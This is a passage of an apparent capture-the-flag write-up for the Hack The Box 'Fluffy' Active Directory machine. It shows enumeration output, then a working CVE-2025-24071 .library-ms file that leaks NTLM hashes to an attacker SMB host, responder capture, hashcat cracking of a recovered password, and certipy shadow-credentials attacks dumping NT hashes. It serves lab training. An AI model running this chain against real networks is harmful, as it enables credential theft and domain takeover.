+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA<span class="o">==</span>
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-05-11T20:26:08+00:00<span class="p">;</span> +6h59m58s from scanner time.
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49749/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker:
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 32564/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 2 <span class="o">(</span>port 56579/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 27142/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 63938/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time:
+|   <span class="nb">date</span>: 2026-05-11T20:25:30
+|_  start_date: N/A
+|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 15:26
+Completed NSE at 15:26, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 15:26
+Completed NSE at 15:26, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 15:26
+Completed NSE at 15:26, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>155.38 seconds
+           Raw packets sent: 131092 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 56 <span class="o">(</span>2.448KB<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="bloodhound">Bloodhound</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bloodhound-python <span class="nt">-u</span> <span class="nv">$USERNAME</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-d</span> <span class="nv">$DOMAIN</span> <span class="nt">-ns</span> <span class="nv">$IP</span> <span class="nt">-c</span> All <span class="nt">--zip</span>
+
+INFO: BloodHound.py <span class="k">for </span>BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
+INFO: Found AD domain: fluffy.htb
+INFO: Getting TGT <span class="k">for </span>user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Testing resolved <span class="nb">hostname </span>connectivity dead:beef::e7c1:d24f:bda:5332
+INFO: Trying LDAP connection to dead:beef::e7c1:d24f:bda:5332
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="k">in </span>the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Testing resolved <span class="nb">hostname </span>connectivity dead:beef::e7c1:d24f:bda:5332
+INFO: Trying LDAP connection to dead:beef::e7c1:d24f:bda:5332
+INFO: Found 10 <span class="nb">users
+</span>INFO: Found 54 <span class="nb">groups
+</span>INFO: Found 3 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.fluffy.htb
+INFO: Done <span class="k">in </span>00M 05S
+INFO: Compressing output into 20260511153716_bloodhound.zip
+</code></pre></div></div>
+
+<p>Interesting Group:
+<img src="/assets/img/ctf/data/fluffy-1.png" alt="fluffy-1" /></p>
+
+<p><img src="/assets/img/ctf/data/fluffy-2.png" alt="fluffy-2" /></p>
+
+<p><img src="/assets/img/ctf/data/fluffy-3.png" alt="fluffy-3" /></p>
+
+<p><img src="/assets/img/ctf/data/fluffy-4.png" alt="fluffy-4" /></p>
+
+<h3 id="smb">SMB</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc smb <span class="nv">$IP</span> <span class="nt">-u</span> <span class="nv">$USERNAME</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-M</span> spider_plus <span class="nt">-o</span> <span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span>True
+
+SMB         10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:fluffy.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.43.160   445    DC01             <span class="o">[</span>+] fluffy.htb<span class="se">\j</span>.fleischman:J0elTHEM4n1990!
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started module spidering_plus with the following options:
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span>  DOWNLOAD_FLAG: True
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span>     STATS_FLAG: True
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> EXCLUDE_FILTER: <span class="o">[</span><span class="s1">'print$'</span>, <span class="s1">'ipc$'</span><span class="o">]</span>
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span>   EXCLUDE_EXTS: <span class="o">[</span><span class="s1">'ico'</span>, <span class="s1">'lnk'</span><span class="o">]</span>
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span>  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span>  OUTPUT_FOLDER: /home/tralsesec/.nxc/modules/nxc_spider_plus
+SMB         10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
+SMB         10.129.43.160   445    DC01             Share           Permissions     Remark
+SMB         10.129.43.160   445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.43.160   445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.43.160   445    DC01             C<span class="nv">$ </span>                             Default share
+SMB         10.129.43.160   445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.129.43.160   445    DC01             IT              READ,WRITE
+SMB         10.129.43.160   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.129.43.160   445    DC01             SYSVOL          READ            Logon server share
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span>+] Saved share-file metadata to <span class="s2">"/home/tralsesec/.nxc/modules/nxc_spider_plus/10.129.43.160.json"</span><span class="nb">.</span>
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Shares:           6 <span class="o">(</span>ADMIN<span class="nv">$,</span> C<span class="nv">$,</span> IPC<span class="nv">$,</span> IT, NETLOGON, SYSVOL<span class="o">)</span>
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Readable Shares:  4 <span class="o">(</span>IPC<span class="nv">$,</span> IT, NETLOGON, SYSVOL<span class="o">)</span>
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Writable Shares:  1 <span class="o">(</span>IT<span class="o">)</span>
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Filtered Shares:  1
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total folders found:  30
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total files found:    29
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Files filtered:       11
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> File size average:    489.15 KB
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> File size min:        23 B
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> File size max:        3.15 MB
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> File unique exts:     14 <span class="o">(</span>dll, pol, ini, cmtx, pdf, inf, zip, exe, config, txt...<span class="o">)</span>
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloads successful: 18
+SPIDER_PLUS 10.129.43.160   445    DC01             <span class="o">[</span>+] All files processed successfully.
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> ~/.nxc/modules/nxc_spider_plus/<span class="nv">$IP</span>
+
+<span class="nv">$ </span><span class="nb">ls
+</span>IT  SYSVOL
+
+<span class="nv">$ </span><span class="nb">ls </span>IT
+KeePass-2.58
+
+<span class="nv">$ </span><span class="nb">cd </span>IT/KeePass-2.58/
+
+<span class="nv">$ </span><span class="nb">ls
+</span>KeePass.exe.config  License.txt  XSL
+</code></pre></div></div>
+
+<p>KeePass 2.58 is vulnerable <a href="https://github.com/alt3kx/CVE-2023-24055_PoC">CVE-2023-24055</a>.</p>
+
+<blockquote class="warning">
+  <p>For some reason <code class="language-plaintext highlighter-rouge">nxc</code> decided to not download the entire contents of the <code class="language-plaintext highlighter-rouge">IT</code> share. That’s why we have to check it manually:</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="s2">"//</span><span class="nv">$IP</span><span class="s2">/IT"</span> <span class="nt">-U</span> <span class="s2">"</span><span class="nv">$USERNAME</span><span class="s2">%</span><span class="nv">$PASSWORD</span><span class="s2">"</span>
+
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Mon May 11 23:06:16 2026
+  ..                                  D        0  Mon May 11 23:06:16 2026
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
+  KeePass-2.58                        D        0  Mon May 11 22:54:25 2026
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025
+
+		5842943 blocks of size 4096. 2022940 blocks available
+smb: <span class="se">\&gt;</span> get Upgrade_Notice.pdf
+getting file <span class="se">\U</span>pgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf <span class="o">(</span>512.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 512.3 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> get Everything-1.4.1.1026.x64.zip
+getting file <span class="se">\E</span>verything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip <span class="o">(</span>1188.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1068.2 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Everything-1.4.1.1026.x64
+smb: <span class="se">\E</span>verything-1.4.1.1026.x64<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Fri Apr 18 17:08:44 2025
+  ..                                  D        0  Fri Apr 18 17:08:44 2025
+  everything.exe                      A  2265104  Fri Aug  2 03:43:54 2024
+  Everything.lng                      A   958342  Thu Jul 25 22:19:04 2024
+
+		5842943 blocks of size 4096. 2026981 blocks available
+smb: <span class="se">\E</span>verything-1.4.1.1026.x64<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>Looking at <code class="language-plaintext highlighter-rouge">Upgrade_Notice.pdf</code> it looks like a pentest report:</p>
+
+<p><img src="/assets/img/ctf/data/fluffy-5.png" alt="fluffy-5" /></p>
+
+<p>The system seems to be vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2025-24071</code>. We will try to exploit that.</p>
+
+<hr />
+
+<h2 id="-2-initial-foothold">🚪 2. Initial Foothold</h2>
+
+<h3 id="cve-2025-24071">CVE-2025-24071</h3>
+
+<p>Create the malicious <code class="language-plaintext highlighter-rouge">.library-ms</code> file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="sh">'</span><span class="no">EOF</span><span class="sh">' &gt; exploit.library-ms
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+      &lt;isSupported&gt;true&lt;/isSupported&gt;
+      &lt;simpleLocation&gt;
+        &lt;url&gt;</span><span class="se">\\</span><span class="sh">10.10.14.219</span><span class="se">\s</span><span class="sh">hare&lt;/url&gt;
+      &lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</span><span class="no">EOF
+</span></code></pre></div></div>
+
+<p>Now zip the file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip exploit.zip ./exploit.library-ms
+  adding: exploit.library-ms <span class="o">(</span>deflated 52%<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Start <code class="language-plaintext highlighter-rouge">responder</code> and wait:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">-dwv</span>
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+&lt;SNIP&gt;
+
+<span class="o">[</span>+] Servers:
+    HTTP server                <span class="o">[</span>ON]
+    HTTPS server               <span class="o">[</span>ON]
+    WPAD proxy                 <span class="o">[</span>ON]
+    Auth proxy                 <span class="o">[</span>OFF]
+    SMB server                 <span class="o">[</span>ON]
+
+&lt;SNIP&gt;
+
+</code></pre></div></div>
+
+<p>Now upload the malicious <code class="language-plaintext highlighter-rouge">.library-ms</code> file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="s2">"//</span><span class="nv">$IP</span><span class="s2">/IT"</span> <span class="nt">-U</span> <span class="s2">"</span><span class="nv">$USERNAME</span><span class="s2">%</span><span class="nv">$PASSWORD</span><span class="s2">"</span> <span class="nt">-c</span> <span class="s1">'put exploit.zip'</span>
+putting file exploit.library-ms as <span class="se">\e</span>xploit.library-ms <span class="o">(</span>0.0 kB/s<span class="o">)</span> <span class="o">(</span>average 0.0 kB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Now wait for the User to open the directory and trigger the connection to us.</p>
+
+<p>And eventually, you will face the following output in <code class="language-plaintext highlighter-rouge">responder</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SMB] NTLMv2-SSP Client   : 10.129.43.160
+<span class="o">[</span>SMB] NTLMv2-SSP Username : FLUFFY<span class="se">\p</span>.agila
+<span class="o">[</span>SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:6265afcf01f58e5b:BBD0E8104A0A26A8583D8D5466DCD5E2:010100000000000080FF7B3861E1DC012C1003A64474989E0000000002000800440035003500410001001E00570049004E002D005500490032003300430052005A004200300054004F0004003400570049004E002D005500490032003300430052005A004200300054004F002E0044003500350041002E004C004F00430041004C000300140044003500350041002E004C004F00430041004C000500140044003500350041002E004C004F00430041004C000700080080FF7B3861E1DC0106000400020000000800300030000000000000000100000000200000F2DC7C6DE25F1B3971D521046178E5D392757710705741670F799BA9FE96D43A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310039000000000000000000
+</code></pre></div></div>
+
+<p>Let’s crack that hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'p.agila::FLUFFY:6265afcf01f58e5b:BBD0E8104A0A26A8583D8D5466DCD5E2:010100000000000080FF7B3861E1DC012C1003A64474989E0000000002000800440035003500410001001E00570049004E002D005500490032003300430052005A004200300054004F0004003400570049004E002D005500490032003300430052005A004200300054004F002E0044003500350041002E004C004F00430041004C000300140044003500350041002E004C004F00430041004C000500140044003500350041002E004C004F00430041004C000700080080FF7B3861E1DC0106000400020000000800300030000000000000000100000000200000F2DC7C6DE25F1B3971D521046178E5D392757710705741670F799BA9FE96D43A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310039000000000000000000'</span> <span class="o">&gt;</span> p.agila.hash <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  hashcat <span class="nt">-m</span> 5600 ./p.agila.hash /usr/share/wordlists/rockyou.txt
+
+&lt;SNIP&gt;
+
+P.AGILA::FLUFFY:6265afcf01f58e5b:bbd0e8104a0a26a8583d8d5466dcd5e2:010100000000000080ff7b3861e1dc012c1003a64474989e0000000002000800440035003500410001001e00570049004e002d005500490032003300430052005a004200300054004f0004003400570049004e002d005500490032003300430052005a004200300054004f002e0044003500350041002e004c004f00430041004c000300140044003500350041002e004c004f00430041004c000500140044003500350041002e004c004f00430041004c000700080080ff7b3861e1dc0106000400020000000800300030000000000000000100000000200000f2dc7c6de25f1b3971d521046178e5d392757710705741670f799ba9fe96d43a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200310039000000000000000000:prometheusx-303
+
+&lt;SNIP&gt;
+</code></pre></div></div>
+
+<p>Found credentials: <code class="language-plaintext highlighter-rouge">p.agila</code> / <code class="language-plaintext highlighter-rouge">prometheusx-303</code>.</p>
+
+<p>Looking at the privileges and permissions of <code class="language-plaintext highlighter-rouge">p.agila</code>, we find the following:
+<img src="/assets/img/ctf/data/fluffy-6.png" alt="fluffy-6" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">p.agila</code> has <code class="language-plaintext highlighter-rouge">GenericAll</code> over <code class="language-plaintext highlighter-rouge">SERVICE_ACCOUNTS</code> which has <code class="language-plaintext highlighter-rouge">GenericAll</code> over <code class="language-plaintext highlighter-rouge">LDAP_SVC</code>, <code class="language-plaintext highlighter-rouge">WINRM_SVC</code> and <code class="language-plaintext highlighter-rouge">CA_SVC</code>.</p>
+
+<p>As <code class="language-plaintext highlighter-rouge">p.agila</code> is no member of group <code class="language-plaintext highlighter-rouge">REMOTE USERS</code>, we won’t be able to get a shell via winrm using her credentials. But we can retrieve the credentials of the <code class="language-plaintext highlighter-rouge">WINRM_SVC</code> service and authenticate then.</p>
+
+<ol>
+  <li>Export credentials</li>
+  <li>Set time to solve <code class="language-plaintext highlighter-rouge">timescrew</code> error</li>
+  <li>Add <code class="language-plaintext highlighter-rouge">p.agila</code> to the <code class="language-plaintext highlighter-rouge">SERVICE ACCOUNTS</code> group in order to perform a Shadow Credentials attack.</li>
+  <li>Shadow Credentials Attack on <code class="language-plaintext highlighter-rouge">WINRM_SVC</code> (get NTLM hash).</li>
+  <li>Shadow Credentials Attack on <code class="language-plaintext highlighter-rouge">CA_SVC</code> (get NTLM hash).
+=&gt; Get hashes of <code class="language-plaintext highlighter-rouge">WINRM_SVC</code> and <code class="language-plaintext highlighter-rouge">CA_SVC</code> without changing any passwords.</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ USERNAME</span><span class="o">=</span><span class="s1">'p.agila'</span> <span class="p">;</span> <span class="nv">PASSWORD</span><span class="o">=</span><span class="s1">'prometheusx-303'</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  <span class="nb">sudo </span>ntpdate <span class="nv">$DOMAIN</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  bloodyAD <span class="nt">--host</span> <span class="nv">$IP</span> <span class="nt">-d</span> <span class="nv">$DOMAIN</span> <span class="nt">-u</span> <span class="nv">$USERNAME</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> add groupMember <span class="s2">"SERVICE ACCOUNTS"</span> <span class="nv">$USERNAME</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  certipy-ad shadow auto <span class="nt">-u</span> <span class="nv">$USERNAME</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-account</span> <span class="s1">'WINRM_SVC'</span> <span class="nt">-target</span> DC01.fluffy.htb <span class="nt">-dc-ip</span> <span class="nv">$IP</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  certipy-ad shadow auto <span class="nt">-u</span> <span class="nv">$USERNAME</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-account</span> <span class="s1">'CA_SVC'</span> <span class="nt">-target</span> DC01.fluffy.htb <span class="nt">-dc-ip</span> <span class="nv">$IP</span>
+
+2026-05-11 23:54:35.331581 <span class="o">(</span>+0200<span class="o">)</span> <span class="nt">-0</span>.001380 +/- 0.010030 fluffy.htb 10.129.43.160 s1 no-leap
+<span class="o">[</span>+] p.agila added to SERVICE ACCOUNTS
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'winrm_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'13b4144b561f4bd09384c763ff44086a'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'13b4144b561f4bd09384c763ff44086a'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'13b4144b561f4bd09384c763ff44086a'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'winrm_svc'</span> with the certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate identities:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     No identities found <span class="k">in </span>this certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: <span class="s1">'winrm_svc@fluffy.htb'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving credential cache to <span class="s1">'winrm_svc.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote credential cache to <span class="s1">'winrm_svc.ccache'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_svc'</span>: 33bd09dcd697600edf6b3a7af4875767
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'ca_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'75d23daa4a444f148ef8d3ae07ea185d'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'75d23daa4a444f148ef8d3ae07ea185d'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'ca_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'75d23daa4a444f148ef8d3ae07ea185d'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'ca_svc'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'ca_svc'</span> with the certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate identities:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     No identities found <span class="k">in </span>this certificate
